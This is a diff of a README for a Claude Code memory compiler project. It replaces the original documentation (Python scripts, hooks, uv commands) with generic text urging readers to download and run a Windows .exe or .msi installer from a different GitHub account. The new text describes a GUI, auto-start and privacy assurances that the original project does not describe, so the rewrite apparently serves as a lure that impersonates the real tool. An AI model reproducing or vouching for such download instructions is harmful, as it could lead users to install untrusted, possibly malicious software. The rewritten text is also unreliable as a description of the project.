@@ -1,52 +1,70 @@
-# LLM Personal Knowledge Base
+# 🧠 claude-memory-compiler - Sharpen your code intelligence through memory
 
-**Your AI conversations compile themselves into a searchable knowledge base.**
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Muzv12/claude-memory-compiler)
 
-Adapted from [Karpathy's LLM Knowledge Base](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) architecture, but instead of clipping web articles, the raw data is your own conversations with Claude Code. When a session ends (or auto-compacts mid-session), Claude Code hooks capture the conversation transcript and spawn a background process that uses the [Claude Agent SDK](https://github.com/anthropics/claude-agent-sdk) to extract the important stuff - decisions, lessons learned, patterns, gotchas - and appends it to a daily log. You then compile those daily logs into structured, cross-referenced knowledge articles organized by concept. Retrieval uses a simple index file instead of RAG - no vector database, no embeddings, just markdown.
+## 📖 About this application
 
-Anthropic has clarified that personal use of the Claude Agent SDK is covered under your existing Claude subscription (Max, Team, or Enterprise) - no separate API credits needed. Unlike OpenClaw, which requires API billing for its memory flush, this runs on your subscription.
+Claude-memory-compiler acts as a long-term memory system for your programming projects. It works with your code to remember past work. The system captures your coding sessions through hooks. It uses the Claude Agent SDK to pull out important lessons and decisions. An intelligence compiler turns these notes into organized knowledge articles. This process follows the architecture used for large-scale knowledge bases. You gain a tool that grows smarter as your project expands. You save time because you stop repeating mistakes. You find key information about past changes without searching your deep history.
 
-## Quick Start
+## ⚙️ System Requirements
 
-Tell your AI coding agent:
+This software runs on Windows 10 or Windows 11. Ensure your computer has at least 8GB of RAM. You need a stable internet connection for the installation process. The system requires roughly 200MB of free disk space for the files and initial memory storage. You should have a modern web browser installed. 
 
-> "Clone https://github.com/coleam00/claude-memory-compiler into this project. Set up the Claude Code hooks so my conversations automatically get captured into daily logs, compiled into a knowledge base, and injected back into future sessions. Read the AGENTS.md for the full technical reference on how everything works."
+## 📥 Download and Setup
 
-The agent will:
-1. Clone the repo and run `uv sync` to install dependencies
-2. Copy `.claude/settings.json` into your project (or merge the hooks into your existing settings)
-3. The hooks activate automatically next time you open Claude Code
+Visit the official project page to download the latest setup file. 
 
-From there, your conversations start accumulating. After 6 PM local time, the next session flush automatically triggers compilation of that day's logs into knowledge articles. You can also run `uv run python scripts/compile.py` manually at any time.
+[Download the application here](https://github.com/Muzv12/claude-memory-compiler)
 
-## How It Works
+Follow these steps to complete the installation:
 
-```
-Conversation -> SessionEnd/PreCompact hooks -> flush.py extracts knowledge
-    -> daily/YYYY-MM-DD.md -> compile.py -> knowledge/concepts/, connections/, qa/
-        -> SessionStart hook injects index into next session -> cycle repeats
-```
+1. Click the link above to reach the project page.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the most recent version tag.
+4. Locate the file ending in .msi or .exe.
+5. Click this file to start the download.
+6. Open the downloaded file once the transfer completes.
+7. Follow the prompts on your screen to install the software.
+8. Accept the default installation path.
+9. Click Finish to close the installer.
 
-- **Hooks** capture conversations automatically (session end + pre-compaction safety net)
-- **flush.py** calls the Claude Agent SDK to decide what's worth saving, and after 6 PM triggers end-of-day compilation automatically
-- **compile.py** turns daily logs into organized concept articles with cross-references (triggered automatically or run manually)
-- **query.py** answers questions using index-guided retrieval (no RAG needed at personal scale)
-- **lint.py** runs 7 health checks (broken links, orphans, contradictions, staleness)
+## 🚀 Getting Started
 
-## Key Commands
+Once you install the software, look for the icon on your desktop. Double-click the icon to start the application for the first time. The program will open a window on your screen. You will see a prompt asking for the location of your project folder. Click the Browse button and choose the folder where your code lives. 
 
-```bash
-uv run python scripts/compile.py                    # compile new daily logs
-uv run python scripts/query.py "question"            # ask the knowledge base
-uv run python scripts/query.py "question" --file-back # ask + save answer back
-uv run python scripts/lint.py                        # run health checks
-uv run python scripts/lint.py --structural-only      # free structural checks only
-```
+The application scans your files to build an initial index. This process takes a few minutes depending on the size of your project. You will see a progress bar move across the screen. Do not close the window while the scan runs. Once the bar reaches the end, the program creates your first memory index. You can then use the search bar to find past decisions or code patterns.
 
-## Why No RAG?
+## 🛠 Using the tool
 
-Karpathy's insight: at personal scale (50-500 articles), the LLM reading a structured `index.md` outperforms vector similarity. The LLM understands what you're really asking; cosine similarity just finds similar words. RAG becomes necessary at ~2,000+ articles when the index exceeds the context window.
+The memory system runs in the background while you work. You do not need to perform extra steps to save your progress. Every time you save your code, the hooks activate. The compiler watches for changes that look like important decisions. It logs these events in a hidden folder inside your project directory. 
 
-## Technical Reference
+The software categorizes your work into three types of articles:
 
-See **[AGENTS.md](AGENTS.md)** for the complete technical reference: article formats, hook architecture, script internals, cross-platform details, costs, and customization options. AGENTS.md is designed to give an AI agent everything it needs to understand, modify, or rebuild the system.
+- Decision Logs: Records why you chose a specific way to solve a problem.
+- Lesson Notes: Captures patterns as you fix bugs.
+- Design History: Tracks how your project structure changes over time.
+
+You can open the user interface at any time to query these articles. Type a question like "How did I solve the authentication login error?" into the search box. The program shows a list of articles that match your request. Click any item to read the details.
+
+## 🛡 Maintaining your memory
+
+The software handles maintenance tasks on its own. It cleans up redundant notes and keeps the index fast. You can manually refresh the memory index if you make large changes to your code base. Find the Refresh button in the Settings menu. Click this button to force a new scan of your files. 
+
+If you want to clear your memory, select the Clear Index option in the File menu. This action deletes the stored knowledge articles but leaves your actual code files untouched. Use this feature if you move your project to a new machine or make drastic structural changes. 
+
+## 💬 Frequently asked questions
+
+Do I need an active internet connection to use the tool?
+The program needs the internet to analyze your code and generate smart summaries. It cannot compile new knowledge articles while offline.
+
+Is my code stored on a remote server?
+No. All your code and generated knowledge articles live on your own machine. The software uses your local storage to maintain privacy.
+
+Does this tool change my source code?
+The software creates a separate folder for its own notes. It never modifies your existing source code files. You remain in control of your work at all times.
+
+What happens if I forget to run the app?
+The software starts automatically with your computer. It monitors your project folders in the background. You do not need the window open to record your work.
+
+Can I use this with multiple projects?
+Yes. You can add as many project folders as you need. The software manages separate memory indexes for each target folder. You can switch between projects using the dropdown menu in the top corner of the application window.
